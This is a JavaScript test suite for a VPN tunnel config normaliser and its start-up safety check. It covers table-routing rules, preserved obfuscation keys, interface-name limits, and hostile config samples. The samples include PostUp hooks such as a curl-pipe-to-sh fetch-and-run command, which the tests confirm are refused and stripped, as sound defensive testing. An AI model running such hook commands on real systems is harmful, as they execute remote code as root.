// Normaliser of tunnel configs (part 4).
//
// The golden pair is synthetic on purpose: the real provider files under
// `dev/root/` carry the owner's PublicKey, Endpoint and obfuscation settings,
// and nothing from a `providers/` root may enter the repository (task §6.4). The
// transformation does not depend on the values, so the proof is the same.
//
// The strongest assertion here is the byte-for-byte one: the diff of the golden
// pair is exactly two lines, `+ Table = off` and `− DNS = 1.1.1.1`, and the
// obfuscation plus `AllowedIPs` must not move by a byte.
//
// Since techdocs/plan_2026_09_23_gatehouse_fuse_and_no_watchdog.md the normaliser
// and the start-up fuse share one parse and one verdict (`tunnelConfigRefusal`),
// so they are tested as a pair: whatever the normaliser accepts, the fuse accepts
// (§A.4). A hostile sample is either refused by the normaliser — then it was never
// accepted, and §A.4 says nothing about it — or normalised into something the fuse
// lets through.

import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import {describe, test} from 'node:test';

import {ConfigError} from '../src/core/errors.mjs';
import {
  INTERFACE_HEADER,
  INTERFACE_NAME_MAX,
  POLICY_ROUTING_TABLE,
  PRESERVED_KEYS,
  chooseInterfaceName,
  normalizeTunnel,
  suggestTunnelName,
  tunnelConfigRefusal,
  validateInterfaceName,
  validateTunnelLabel,
} from '../src/core/normalize.mjs';
import {FIXTURES_DIR} from './helpers.mjs';

const PROVIDER = path.join(FIXTURES_DIR, 'tunnel', 'provider.conf');
const NORMALIZED = path.join(FIXTURES_DIR, 'tunnel', 'normalized.conf');

const providerText = fs.readFileSync(PROVIDER, 'utf8');
const normalizedText = fs.readFileSync(NORMALIZED, 'utf8');

/** A line of a config by its key, or null. */
function lineOf(text, key) {
  return text.split('\n').find((line) => new RegExp(`^\\s*${key}\\s*=`).test(line)) ?? null;
}

describe('normalizeTunnel on the synthetic golden pair (NEW)', () => {
  test('the result is byte for byte the golden file', () => {
    const result = normalizeTunnel(providerText, {name: 'hmn-graz4'});

    assert.equal(result.text, normalizedText);
    assert.ok(
      Buffer.from(result.text, 'utf8').equals(fs.readFileSync(NORMALIZED)),
      'byte for byte, not merely equal as strings',
    );
  });

  test('exactly the two mandatory changes are reported, each with a reason', () => {
    const {changes} = normalizeTunnel(providerText, {name: 'hmn-graz4'});

    assert.equal(changes.length, 2);
    assert.deepEqual(
      changes.map((change) => [change.kind, change.line]),
      [
        ['add', 'Table = off'],
        ['remove', 'DNS = 1.1.1.1'],
      ],
    );
    for (const change of changes) {
      assert.ok(change.why.length > 0, 'every change carries a reason');
    }
  });

  test('the interface name is validated, and reported', () => {
    const result = normalizeTunnel(providerText, {name: 'hmn-graz4'});
    assert.equal(result.name, 'hmn-graz4');
    assert.ok(result.name.length <= INTERFACE_NAME_MAX);
  });
});

describe('the intangible keys are copied byte for byte (NEW)', () => {
  test('every obfuscation key and AllowedIPs is reported as preserved', () => {
    const {preserved} = normalizeTunnel(providerText, {name: 'hmn-graz4'});

    for (const key of ['AllowedIPs', 'Jc', 'Jmin', 'Jmax', 'S1', 'S4', 'H1', 'H4', 'i1']) {
      assert.ok(preserved.includes(key), `${key} must be reported as untouched`);
    }
    assert.deepEqual(
      preserved,
      PRESERVED_KEYS.filter((key) => lineOf(providerText, key) !== null),
    );
  });

  test('their lines are identical before and after', () => {
    const {text} = normalizeTunnel(providerText, {name: 'hmn-graz4'});

    for (const key of PRESERVED_KEYS) {
      assert.equal(lineOf(text, key), lineOf(providerText, key), `${key} moved`);
    }
  });
});

describe('mandatory rules are idempotent and complete (NEW)', () => {
  test('a config that already has Table = off is left alone, and no DNS line means no removal', () => {
    const config = ['[Interface]', 'Table = off', 'PrivateKey = x', '[Peer]', 'AllowedIPs = 0.0.0.0/0'].join('\n');

    const result = normalizeTunnel(config, {name: 'wg0'});

    assert.equal(result.text, config);
    assert.deepEqual(result.changes, []);
  });

  test('a Table that does not say off is replaced by the canonical line', () => {
    // The value is what `awg-quick` reads, so the fix is a remove plus an add: a
    // `change` kind would hide which line the wrong value came from (§5.1).
    const config = ['[Interface]', 'Table = auto', 'PrivateKey = x'].join('\n');

    const result = normalizeTunnel(config, {name: 'wg0'});

    assert.equal(result.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
    assert.deepEqual(
      result.changes.map((change) => [change.kind, change.line]),
      [
        ['remove', 'Table = auto'],
        ['add', 'Table = off'],
      ],
    );
    assert.equal(tunnelConfigRefusal(result.text), null);
  });

  test('a config without [Interface] is refused', () => {
    assert.throws(
      () => normalizeTunnel('[Peer]\nAllowedIPs = 0.0.0.0/0\n', {name: 'wg0'}),
      (error) => error instanceof ConfigError && /\[Interface\]/.test(error.message),
    );
  });

  test('the newline style and the trailing newline survive', () => {
    const config = '[Interface]\r\nTable = off\r\nPrivateKey = x\r\n';

    const result = normalizeTunnel(config, {name: 'wg0'});

    assert.equal(result.text, config);
  });
});

describe('the single optional flag: policy routing (NEW)', () => {
  test('off by default — no PostUp appears', () => {
    const {text} = normalizeTunnel(providerText, {name: 'hmn-graz4'});
    assert.ok(!text.includes('PostUp'));
    assert.ok(!text.includes('PreDown'));
  });

  test('on adds PostUp/PreDown with an ip rule built from Address', () => {
    const result = normalizeTunnel(providerText, {name: 'hmn-graz4', policyRouting: true});

    assert.match(result.text, /^PostUp = ip rule add from 100\.64\.0\.2 table 200$/m);
    assert.match(result.text, /^PreDown = ip rule del from 100\.64\.0\.2 table 200$/m);
    assert.equal(POLICY_ROUTING_TABLE, 200);
    assert.equal(result.changes.length, 4);
  });

  test('policy routing without Address is refused', () => {
    assert.throws(
      () => normalizeTunnel('[Interface]\nTable = off\nPrivateKey = x\n', {
        name: 'wg0',
        policyRouting: true,
      }),
      (error) => error instanceof ConfigError && /Address/.test(error.message),
    );
  });
});

describe('interface name rules (NEW)', () => {
  test('an empty desired name falls back to awg0', () => {
    assert.equal(chooseInterfaceName('', new Set()), 'awg0');
  });

  test('a taken name grows a suffix within the limit', () => {
    const taken = new Set(['hmn-graz4']);
    const chosen = chooseInterfaceName('hmn-graz4', taken);

    assert.notEqual(chosen, 'hmn-graz4');
    assert.ok(chosen.length <= INTERFACE_NAME_MAX);
    assert.ok(chosen.startsWith('hmn-graz4'));
  });

  test('a name longer than the kernel limit is refused', () => {
    assert.throws(
      () => chooseInterfaceName('a'.repeat(INTERFACE_NAME_MAX + 1), new Set()),
      (error) => error instanceof ConfigError && /15 символов/.test(error.message),
    );
  });
});

describe('the two tunnel names (NEW)', () => {
  test('the human-readable name is suggested from provider and file stem', () => {
    assert.equal(suggestTunnelName('hidemyname', 'AustriaGrazS4.conf'), 'hidemyname-AustriaGrazS4');
    assert.equal(suggestTunnelName('amnezia', 'de.conf'), 'amnezia-de');
  });

  test('the file name obeys the kernel limit and the character set', () => {
    assert.equal(validateInterfaceName(' hmn-graz4 '), 'hmn-graz4');
    assert.throws(() => validateInterfaceName(''), /не может быть пустым/);
    assert.throws(() => validateInterfaceName('a'.repeat(INTERFACE_NAME_MAX + 1)), /15 символов/);
    assert.throws(() => validateInterfaceName('bad/name'), /недопустимые символы/);
    assert.throws(() => validateInterfaceName('de.conf'), /\.conf/);
    assert.throws(() => validateInterfaceName('-de'), /начинаться/);
    assert.throws(() => validateInterfaceName('..'), /недопустимо/);
  });

  test('the human-readable name is validated separately and may be long', () => {
    const long = 'x'.repeat(255);
    assert.equal(validateTunnelLabel(long), long);
    assert.throws(() => validateTunnelLabel('y'.repeat(256)), /255/);
    assert.throws(() => validateTunnelLabel('a/b'), /\//);
    assert.throws(() => validateTunnelLabel(''), /пустым/);
  });

});

describe('the start-up fuse reads the config the way awg-quick does (NEW)', () => {
  test('a lowercased table key instead of the first one is not a bypass', () => {
    // The hole this task closes: the normaliser wrote `Table = off` after
    // `[Interface]` and left `table = auto` where it was, while `awg-quick`
    // honoured the LAST value and pulled the whole router into the tunnel.
    const hostile = ['[Interface]', 'table = auto', 'PrivateKey = x'].join('\n');
    const refusal = tunnelConfigRefusal(hostile);

    assert.equal(refusal.code, 'table-value');
    assert.equal(refusal.line, 'table = auto');

    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
    assert.equal(fixed.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
    assert.deepEqual(
      fixed.changes.map((change) => [change.kind, change.line]),
      [
        ['remove', 'table = auto'],
        ['add', 'Table = off'],
      ],
    );
    assert.equal(tunnelConfigRefusal(fixed.text), null);
  });

  test('a correct Table with another one after it is refused too', () => {
    const hostile = ['[Interface]', 'Table = off', 'Table = auto', 'PrivateKey = x'].join('\n');

    assert.equal(tunnelConfigRefusal(hostile).code, 'table-value');

    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
    assert.equal(fixed.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
    assert.deepEqual(
      fixed.changes.map((change) => [change.kind, change.line]),
      [['remove', 'Table = auto']],
    );
    assert.equal(tunnelConfigRefusal(fixed.text), null);
  });

  test('a trailing comment is not part of the value', () => {
    const ok = ['[Interface]', 'Table = off  # почему именно off', 'PrivateKey = x'].join('\n');

    assert.equal(tunnelConfigRefusal(ok), null);
    // The value already says `off`, so the line is left exactly as it is: the
    // comment is the owner's, not ours to delete.
    assert.equal(normalizeTunnel(ok, {name: 'wg0'}).text, ok);
    assert.deepEqual(normalizeTunnel(ok, {name: 'wg0'}).changes, []);
  });

  test('the value is compared case-sensitively, so OFF is a refusal', () => {
    const hostile = ['[Interface]', 'Table = OFF', 'PrivateKey = x'].join('\n');

    assert.equal(tunnelConfigRefusal(hostile).code, 'table-value');

    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
    assert.equal(fixed.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
    assert.equal(tunnelConfigRefusal(fixed.text), null);
  });

  test('a table in [Peer] is neither a directive nor a way through', () => {
    const config = [
      '[Interface]',
      'PrivateKey = x',
      '[Peer]',
      'Table = off',
      'DNS = 1.1.1.1',
      'AllowedIPs = 0.0.0.0/0',
    ].join('\n');

    assert.equal(tunnelConfigRefusal(config).code, 'table-missing');

    const fixed = normalizeTunnel(config, {name: 'wg0'});
    assert.deepEqual(
      fixed.changes.map((change) => [change.kind, change.line]),
      [['add', 'Table = off']],
    );
    assert.ok(
      fixed.text.includes('[Peer]\nTable = off\nDNS = 1.1.1.1'),
      'the peer section comes out byte for byte',
    );
  });
});

describe('the header, and how many of them there are (NEW)', () => {
  test('a lowercased [interface] is refused by the fuse and fixed by the normaliser', () => {
    const hostile = ['[interface]', 'table = auto', 'PrivateKey = x'].join('\n');

    assert.equal(tunnelConfigRefusal(hostile).code, 'interface-header');

    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
    assert.equal(INTERFACE_HEADER, '[Interface]');
    assert.equal(fixed.text, ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'));
    assert.deepEqual(
      fixed.changes.map((change) => [change.kind, change.line]),
      [
        ['change', '[interface]'],
        ['remove', 'table = auto'],
        ['add', 'Table = off'],
      ],
    );
    assert.equal(tunnelConfigRefusal(fixed.text), null);
  });

  test('two [Interface] sections are refused by both, whatever the case', () => {
    for (const secondHeader of ['[Interface]', '[interface]']) {
      const hostile = [
        '[Interface]',
        'Table = off',
        secondHeader,
        'Table = auto',
        'PrivateKey = x',
      ].join('\n');

      assert.equal(
        tunnelConfigRefusal(hostile).code,
        'interface-sections',
        `two sections must be refused (second header written as ${secondHeader})`,
      );
      assert.throws(
        () => normalizeTunnel(hostile, {name: 'wg0'}),
        (error) => error instanceof ConfigError && /больше одной секции/.test(error.message),
      );
    }
  });
});

describe('the provider hooks are commands run as root (NEW)', () => {
  test('a hook line is refused, quoted in full, and deleted by the normaliser', () => {
    const line = 'PostUp = curl -s http://example.invalid/install.sh | sh';
    const hostile = ['[Interface]', 'Table = off', line, 'PrivateKey = x'].join('\n');

    const refusal = tunnelConfigRefusal(hostile);
    assert.equal(refusal.code, 'hook');
    assert.equal(refusal.line, line, 'the whole line, so the owner sees what was stopped');

    const fixed = normalizeTunnel(hostile, {name: 'wg0'});
    assert.ok(!fixed.text.includes('curl'), 'the command must not survive');
    const removed = fixed.changes.find((change) => change.kind === 'remove');
    assert.equal(removed.line, line);
    assert.match(removed.why, /от root/);
    assert.equal(tunnelConfigRefusal(fixed.text), null);
  });

  test('every hook key is a refusal, and so is a wrong SaveConfig', () => {
    for (const key of ['PreUp', 'PostUp', 'PreDown', 'PostDown']) {
      const hostile = ['[Interface]', 'Table = off', `${key} = touch /tmp/x`].join('\n');
      assert.equal(tunnelConfigRefusal(hostile).code, 'hook', `${key} must be refused`);
    }

    assert.equal(
      tunnelConfigRefusal(['[Interface]', 'Table = off', 'SaveConfig = true'].join('\n')).code,
      'saveconfig',
    );
    assert.equal(
      tunnelConfigRefusal(['[Interface]', 'Table = off', 'SaveConfig = false'].join('\n')),
      null,
      'false is the only value allowed',
    );

    // The normaliser drops the key either way: a config we generate never has it.
    const fixed = normalizeTunnel(
      ['[Interface]', 'Table = off', 'SaveConfig = false', 'PrivateKey = x'].join('\n'),
      {name: 'wg0'},
    );
    assert.ok(!/saveconfig/i.test(fixed.text));
    assert.equal(tunnelConfigRefusal(fixed.text), null);
  });

  test('only the exact ip rule pair written for policy routing gets through', () => {
    const withPolicy = normalizeTunnel(providerText, {name: 'hmn-graz4', policyRouting: true});
    assert.equal(
      tunnelConfigRefusal(withPolicy.text),
      null,
      'the normaliser may not write what its own fuse refuses (§A.4)',
    );

    assert.equal(
      tunnelConfigRefusal(
        ['[Interface]', 'Table = off', 'PostUp = ip rule add from 10.0.0.1 table 201'].join('\n'),
      ).code,
      'hook',
      'the wrong table is not our rule',
    );

    // The same shape with the wrong verb: `add` for PreDown, `del` for PostUp.
    assert.equal(
      tunnelConfigRefusal(
        ['[Interface]', 'Table = off', 'PreDown = ip rule add from 10.0.0.1 table 200'].join('\n'),
      ).code,
      'hook',
    );
    assert.equal(
      tunnelConfigRefusal(
        ['[Interface]', 'Table = off', 'PostUp = ip rule del from 10.0.0.1 table 200'].join('\n'),
      ).code,
      'hook',
    );
  });
});

describe('the invariant: what the normaliser accepted, the fuse accepts (NEW)', () => {
  const samples = [
    providerText,
    normalizedText,
    ['[Interface]', 'Table = off', 'PrivateKey = x'].join('\n'),
    ['[Interface]', 'table = auto', 'DNS = 1.1.1.1', 'SaveConfig = true', 'PostUp = curl x | sh'].join(
      '\n',
    ),
    ['[interface]', 'privatekey = x'].join('\n'),
    ['[Interface]', 'Table = off', 'Table = off', 'PrivateKey = x'].join('\n'),
    '[Interface]\r\nTable = off\r\nPrivateKey = x\r\n[Peer]\r\nAllowedIPs = 0.0.0.0/0\r\n',
    ['[Interface]', 'Address = 100.64.0.2/32, fd00::2/128', 'table = auto', 'PrivateKey = x'].join(
      '\n',
    ),
    ['[Interface]', '[Peer]'].join('\n'),
  ];

  test('every accepted sample comes out passing the fuse, with and without policy routing', () => {
    for (const sample of samples) {
      for (const policyRouting of [false, true]) {
        let result;
        try {
          result = normalizeTunnel(sample, {name: 'wg0', policyRouting});
        } catch (error) {
          assert.ok(
            error instanceof ConfigError,
            `unexpected error for ${JSON.stringify(sample)}: ${error}`,
          );
          continue;
        }

        assert.equal(
          tunnelConfigRefusal(result.text),
          null,
          `the fuse refuses what the normaliser accepted: ${JSON.stringify(sample)}`,
        );
      }
    }
  });

  test('policy routing without an IPv4 Address is refused, never written', () => {
    // The rule is built from an IPv4 source address, so a config that has none is
    // refused here — otherwise the normaliser would write what the fuse rejects.
    assert.throws(
      () =>
        normalizeTunnel(
          ['[Interface]', 'Table = off', 'Address = fd00::2/128', 'PrivateKey = x'].join('\n'),
          {name: 'wg0', policyRouting: true},
        ),
      (error) => error instanceof ConfigError && /Address/.test(error.message),
    );
  });
});
